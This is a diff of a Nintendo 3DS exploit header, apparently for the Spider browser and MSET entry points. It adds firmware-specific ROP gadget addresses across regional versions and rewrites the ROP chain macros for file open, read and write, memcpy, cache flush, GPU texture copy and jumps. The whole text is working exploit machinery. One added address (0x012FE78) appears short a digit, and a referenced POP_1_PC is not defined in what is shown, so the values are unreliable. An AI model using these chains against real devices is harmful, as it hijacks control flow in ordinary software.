@@ -77,6 +77,7 @@
 	#define POP_LR_PC			0x002D6A34
 	#define POP_PC				0x0010DB6C
 	#define	POP_R0_PC			0x002AD574
+	#define POP_R1_2_3_PC			0x00217450
 	#define POP_R0_1_2_3_4_PC		0x0029C170
 //	#define POP_R0_1_2_3_4_PC		0x0022B550
 	#define POP_R0_1_2_3_4_7_PC		0x0017943B
@@ -114,6 +115,7 @@
 	#define LDMFD_SP_R4_5_PC		0x00101A44
 	#define POP_PC				0x001057B4
 	#define	POP_R0_PC			0x0010C2F8
+	#define POP_R1_2_3_PC			0x00103DC8
 	#define POP_R4_5_6_PC			0x0010014C //CN?
 	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x00106598
 	#if defined(SPIDER_42_CN) //1.7538.CN FW4.2
@@ -129,6 +131,7 @@
 		#define CALL_BX_LR			0x0023E4DC
 		#define CALL_BX_LR_2			0x00190118
 		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C469C
+		#define POP_LR_PC			0x0012FE98
 		#define POP_R0_1_2_3_4_7_PC		0x001932FB
 		#define POP_R1_PC			0x00226B2C
 		#define SP_LR_LDMFD_SP_LR_PC		0x0012FE94
@@ -146,6 +149,7 @@
 		#define CALL_BX_LR			0x0023F424
 		#define CALL_BX_LR_2			0x00190D30
 		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C4EC4
+		#define POP_LR_PC			0x0012FE6C
 		#define POP_R0_1_2_3_4_7_PC		0x00193F13
 		#define POP_R1_PC			0x00227A28
 		#define SP_LR_LDMFD_SP_LR_PC		0x0012FE68
@@ -163,6 +167,7 @@
 		#define CALL_BX_LR			0x0023F478
 		#define CALL_BX_LR_2			0x00190D34
 		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C4F14
+		#define POP_LR_PC			0x0012FE98
 		#define POP_R0_1_2_3_4_7_PC		0x00193F1B
 		#define POP_R1_PC			0x00227A64
 		#define SP_LR_LDMFD_SP_LR_PC		0x0012FE94
@@ -173,9 +178,11 @@
 	#define CALL_3				0x0011DD68
 //	#define DMC				0x?
 	#define LDMFD_SP_R4_5_PC		0x00101A40
+	#define POP_LR_PC			0x0012FEA8
 	#define POP_PC				0x001057E4
 	#define	POP_R0_PC			0x0010C324
 	#define	POP_R1_PC			0x00226AF8
+	#define POP_R1_2_3_PC			0x00103DC0
 //	#define POP_R4_5_6_PC			0x?
 	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x001065C8
 	#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012BD30 
@@ -200,6 +207,7 @@
 	#define LDMFD_SP_R4_5_PC		0x00101A40
 	#define POP_PC				0x001057E0
 	#define	POP_R0_PC			0x0010C320
+	#define POP_R1_2_3_PC			0x00103DC0
 	#define POP_R4_5_6_PC			0x0010014C
 	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x001065C4
 //	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x0010CC4C
@@ -216,6 +224,7 @@
 		#define CALL_BX_LR			0x0023ECA0
 		#define CALL_BX_LR_2			0x001902A8
 		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C4E98
+		#define POP_LR_PC			0x0012FEC0
 		#define POP_R0_1_2_3_4_7_PC		0x0019348B
 		#define POP_R1_PC			0x002272A0
 		#define SP_LR_LDMFD_SP_LR_PC		0x0012FEBC
@@ -233,6 +242,7 @@
 		#define CALL_BX_LR			0x0023FC70
 		#define CALL_BX_LR_2			0x0019154C
 		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C5748
+		#define POP_LR_PC			0x0012FE94
 		#define POP_R0_1_2_3_4_7_PC		0x00194733
 		#define POP_R1_PC			0x00228274
 		#define SP_LR_LDMFD_SP_LR_PC		0x0012FE90
@@ -250,6 +260,7 @@
 		#define CALL_BX_LR			0x0023FD04
 		#define CALL_BX_LR_2			0x00191594
 		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C57D8
+		#define POP_LR_PC			0x0012FEC0
 		#define POP_R0_1_2_3_4_7_PC		0x0019477B
 		#define POP_R1_PC			0x002282F0
 		#define SP_LR_LDMFD_SP_LR_PC		0x0012FEBC
@@ -296,6 +307,7 @@
 	#define LDMFD_SP_R4_5_PC		0x00101A34
 	#define POP_PC				0x001057C4
 	#define	POP_R0_PC			0x0010C2FC
+	#define POP_R1_2_3_PC			0x00103DAC
 	#define POP_R4_5_6_PC			0x0010014C
 	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x001065A8
 	#if defined(SPIDER_9X_CN) //1.7567.CN
@@ -311,6 +323,7 @@
 		#define CALL_BX_LR			0x0023ECA0
 		#define CALL_BX_LR_2			0x001902B8
 		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C4EB0
+		#define POP_LR_PC			0x012FE78
 		#define POP_R0_1_2_3_4_7_PC		0x0019349B
 		#define POP_R1_PC			0x0022728C
 		#define SP_LR_LDMFD_SP_LR_PC		0x0012FE74
@@ -328,6 +341,7 @@
 		#define CALL_BX_LR			0x0023FC6C
 		#define CALL_BX_LR_2			0x00191554
 		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C5760
+		#define POP_LR_PC			0x0012FE4C
 		#define POP_R0_1_2_3_4_7_PC		0x0019473B
 		#define POP_R1_PC			0x0022825C
 		#define SP_LR_LDMFD_SP_LR_PC		0x0012FE48
@@ -345,6 +359,7 @@
 		#define CALL_BX_LR			0x0023FD00
 		#define CALL_BX_LR_2			0x0019159C
 		#define LDMFD_SP_R4_5_6_LR_BX_R12	0x002C57F8
+		#define POP_LR_PC			0x0012FE78
 		#define POP_R0_1_2_3_4_7_PC		0x00194783
 		#define POP_R1_PC			0x002282D8
 		#define SP_LR_LDMFD_SP_LR_PC		0x0012FE74
@@ -425,10 +440,7 @@
 		#endif
 		#define rop_sleep(ns)			.word POP_R4_5_6_7_8_9_10_11_12_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, POP_PC, LDMFD_SP_R4_5_6_LR_BX_R12, GARBAGE, GARBAGE, GARBAGE, POP_PC, POP_R0_PC, ns, POP_R1_PC, 0, CALL_BX_LR
 		#define rop_fs_mount(drive)		.word POP_R0_PC, drive, FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC, GARBAGE, GARBAGE, GARBAGE
-		#define rop_file_open(handle, filename, mode)	.word POP_R0_1_2_3_4_7_PC, handle, ROP_LOC+filename, mode, GARBAGE, GARBAGE, GARBAGE, IFile_Open, GARBAGE, GARBAGE, GARBAGE, GARBAGE, POP_PC
-		#define rop_file_read(handle, readcount, buffer, size)	.word POP_R0_1_2_3_4_7_PC, handle, readcount, buffer, size, GARBAGE, GARBAGE, IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
-		#define rop_file_write(handle, writecount, buffer, size)	.word POP_R0_1_2_3_4_7_PC, handle, writecount, buffer, size, GARBAGE, GARBAGE, IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
-		#define rop_memcpy(dst, src, size)	.word POP_R0_1_2_3_4_7_PC, dst, src, size, GARBAGE, GARBAGE, GARBAGE, MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
+//Workaround for missing gsgpuhandle/HANDLE_PTR
 		#define rop_flush_data_cache(buffer, size) .word POP_R4_5_6_7_8_9_10_11_12_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, POP_PC, LDMFD_SP_R4_5_6_LR_BX_R12, GARBAGE, GARBAGE, GARBAGE, POP_PC, POP_R0_PC, buffer, POP_1_PC, size, CALL_BX_LR_2
 	#else
 		#ifndef SPIDER_ROP_LOC //2nd stage Spider
@@ -436,38 +448,26 @@
 		#endif
 		#define rop_sleep(ns)			.word POP_LR_PC, POP_PC, POP_R0_PC, ns, POP_R1_PC, 0, SVC_0A_BX_LR 
 		#define rop_fs_mount(drive)		.word POP_LR_PC, POP_PC, POP_R0_PC, drive, FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC
-		#define rop_file_read(handle, readcount, buffer, size)	.word POP_LR_PC, POP_PC, POP_R0_1_2_3_4_PC, handle, readcount, buffer, size, GARBAGE, IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC
-		#define rop_file_write(handle, writecount, buffer, size)	.word POP_LR_PC, POP_PC, POP_R0_1_2_3_4_PC, handle, writecount, buffer, size, GARBAGE, IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC
-		#define rop_memcpy(dst, src, size)	.word POP_LR_PC, POP_PC, POP_R0_1_2_3_4_PC, dst, src, size, GARBAGE, GARBAGE, MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR
-		#define rop_flush_data_cache(buffer, size) .word POP_LR_PC, POP_PC, POP_R0_1_2_3_4_PC, HANDLE_PTR, KPROCESS_HANDLE, buffer, size, GARBAGE, GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC
-		#if defined(SPIDER_4X)
-			#define rop_file_open(handle, filename, mode)	.word POP_LR_PC, POP_PC, POP_R0_1_2_3_4_PC, handle, ROP_LOC+filename, mode, GARBAGE, GARBAGE, IFile_Open_LDMFD_SP_R4_5_6_7_PC
-		#else
-			#define rop_file_open(handle, filename, mode)	.word POP_LR_PC, POP_PC, POP_R0_1_2_3_4_PC, handle, ROP_LOC+filename, mode, GARBAGE, GARBAGE, IFile_Open_LDMFD_SP_R4_5_6_7_8_PC
-		#endif
+		#define rop_flush_data_cache(buffer, size) .word POP_LR_PC, POP_PC, POP_R0_PC, HANDLE_PTR, POP_R1_2_3_PC, KPROCESS_HANDLE, buffer, size, GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC
+	#endif
+	#define rop_memcpy(dst, src, size)	.word POP_LR_PC, POP_PC, POP_R0_PC, dst, POP_R1_2_3_PC, src, size, GARBAGE, MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR
+	#define rop_file_read(handle, readcount, buffer, size)	.word POP_LR_PC, POP_PC, POP_R0_PC, handle, POP_R1_2_3_PC, readcount, buffer, size, IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC
+	#define rop_file_write(handle, writecount, buffer, size)	.word POP_LR_PC, POP_PC, POP_R0_PC, handle, POP_R1_2_3_PC, writecount, buffer, size, IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC
+	#if defined(SPIDER_4X)
+		#define rop_file_open(handle, filename, mode)	.word POP_LR_PC, POP_PC, POP_R0_PC, handle, POP_R1_2_3_PC, ROP_LOC+filename, mode, GARBAGE, IFile_Open_LDMFD_SP_R4_5_6_7_PC
+	#else
+		#define rop_file_open(handle, filename, mode)	.word POP_LR_PC, POP_PC, POP_R0_PC, handle, POP_R1_2_3_PC, ROP_LOC+filename, mode, GARBAGE, IFile_Open_LDMFD_SP_R4_5_6_7_8_PC
 	#endif
 #endif
-/*
-#define rop_fs_mount(drive) .word POP_R0_PC, drive, FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC, GARBAGE, GARBAGE, GARBAGE
-#define rop_file_open(handle, filename, mode) .word POP_R0_1_2_3_4_7_PC, handle, ROP_LOC+filename, mode, GARBAGE, GARBAGE, GARBAGE, IFile_Open, GARBAGE, GARBAGE, GARBAGE, GARBAGE, POP_PC
-#define rop_file_read(handle, readcount, buffer, size) .word POP_R0_1_2_3_4_7_PC, handle, readcount, buffer, size, GARBAGE, GARBAGE, IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
-#define rop_file_write(handle, writecount, buffer, size) .word POP_R0_1_2_3_4_7_PC, handle, writecount, buffer, size, GARBAGE, GARBAGE, IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
-#define rop_memcpy(dst, src, size) .word POP_R0_1_2_3_4_PC, dst, src, size, GARBAGE, GARBAGE, MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
-#define rop_sleep(ns) .word POP_R0_PC, ns, POP_R1_PC, 0, POP_LR_PC, POP_PC, SVC_0A_BX_LR 
-#define rop_flush_data_cache(handle, kprocess, buffer, size) .word POP_R0_1_2_3_4_PC, handle, kprocess, buffer, size, GARBAGE, POP_LR_PC, POP_PC, GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC
-*/
 #define JOIN(a,b)	a##b
 #define LABEL(a)	JOIN(loc_, a)
 #define LINE_LABEL	LABEL(__LINE__)
 #if !(defined(SPIDER_4X) || defined(SPIDER_5X) || defined(SPIDER_9X) || defined(MSET_4X) || defined(MSET_4X_DG) || defined(MSET_6X)) //SPIDER CN,KR,TW
+//Workaround for missing CN/KR/TW GetInterruptReceiver
 	#define rop_gx_texture_copy(src, dst, size)	.word POP_R4_5_6_7_8_9_10_11_12_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, POP_PC, LDMFD_SP_R4_5_6_LR_BX_R12, GARBAGE, GARBAGE, GARBAGE, POP_PC, POP_R0_1_2_3_4_7_PC, src, dst, (size+0xF)&~0xF, 0x00000000, 0x00182C87, 0x001B560C, LDMFD_SP_R4_5_PC, 0x0000000F, CALL_3, BLX_R5_LDMFD_SP_R4_5_6_7_8_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, POP_PC, POP_PC
 #elif defined(SPIDER_4X)
-//	#define rop_gx_command(command) .word POP_R0_PC, nn__gxlow__CTR__detail__GetInterruptReceiver+0x58, POP_R1_PC, ROP_LOC+command, POP_LR_PC, POP_PC, nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_PC
-//	#define rop_gx_texture_copy(src, dst, size) .word GX_SetTextureCopy, src, dst, (size+0xF)&~0xF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008, 0
 	#define rop_gx_texture_copy(src, dst, size)	LINE_LABEL:	.word POP_R0_PC, nn__gxlow__CTR__detail__GetInterruptReceiver+0x58, POP_R1_PC, ROP_LOC+LINE_LABEL+0x14, nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_PC + 4, GX_SetTextureCopy, src, dst, (size+0xF)&~0xF, 0xFFFFFFFF, POP_R0_PC, 0x00000008
 #else
-//	#define rop_gx_command(command) .word POP_R0_PC, nn__gxlow__CTR__detail__GetInterruptReceiver+0x58, POP_R1_PC, ROP_LOC+command, POP_LR_PC, POP_PC, nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC
-//	#define rop_gx_texture_copy(src, dst, size) .word GX_SetTextureCopy, src, dst, (size+0xF)&~0xF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008, 0
 	#define rop_gx_texture_copy(src, dst, size)	LINE_LABEL:	.word POP_R0_PC, nn__gxlow__CTR__detail__GetInterruptReceiver+0x58, POP_R1_PC, ROP_LOC+LINE_LABEL+0x14, nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC + 4, GX_SetTextureCopy, src, dst, (size+0xF)&~0xF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008
 #endif
 #define rop_jump(address)		.word POP_R4_5_6_7_8_9_10_11_12_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, POP_PC, LDMFD_SP_R4_5_6_LR_BX_R12, GARBAGE, GARBAGE, GARBAGE, address-4, SP_LR_LDMFD_SP_LR_PC
